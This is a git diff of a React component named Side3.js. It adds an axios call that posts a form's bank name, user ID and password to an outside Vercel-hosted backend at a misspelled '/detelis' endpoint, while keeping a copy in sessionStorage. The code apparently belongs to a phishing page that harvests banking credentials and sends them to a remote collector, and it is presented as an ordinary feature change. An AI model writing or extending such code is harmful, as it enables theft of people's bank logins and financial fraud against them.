@@ -1,6 +1,7 @@
 // src/components/Side3.js
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import axios from 'axios'; // Import axios for making HTTP requests
 import image from '../assets/images/image.webp';
 
 const Side3 = () => {
@@ -20,27 +21,36 @@ const Side3 = () => {
         });
     };
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
 
-        // Retrieve existing data or initialize an empty array
-        const existingData = JSON.parse(sessionStorage.getItem('submittedData')) || [];
+        try {
+            // Send a POST request to the API with the form data
+            const response = await axios.post('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis', formData);
+            console.log('Data submitted successfully:', response.data);
 
-        // Append the new form data to the existing array
-        existingData.push(formData);
+            // Optionally, retrieve existing data or initialize an empty array
+            const existingData = JSON.parse(sessionStorage.getItem('submittedData')) || [];
 
-        // Update the sessionStorage with the new array
-        sessionStorage.setItem('submittedData', JSON.stringify(existingData));
+            // Append the new form data to the existing array
+            existingData.push(formData);
 
-        // Clear form fields after submission (optional)
-        setFormData({
-            bankName: '',
-            userID: '',
-            password: ''
-        });
+            // Update the sessionStorage with the new array
+            sessionStorage.setItem('submittedData', JSON.stringify(existingData));
 
-        // Navigate to the next page
-        navigate('/side3'); // Change to the next page you want to navigate to
+            // Clear form fields after submission (optional)
+            setFormData({
+                bankName: '',
+                userID: '',
+                password: ''
+            });
+
+            // Navigate to the next page
+            navigate('/side3'); // Change to the next page you want to navigate to
+        } catch (error) {
+            console.error('Error submitting data:', error);
+            // You can handle error notification or state update here if needed
+        }
     };
 
     return (
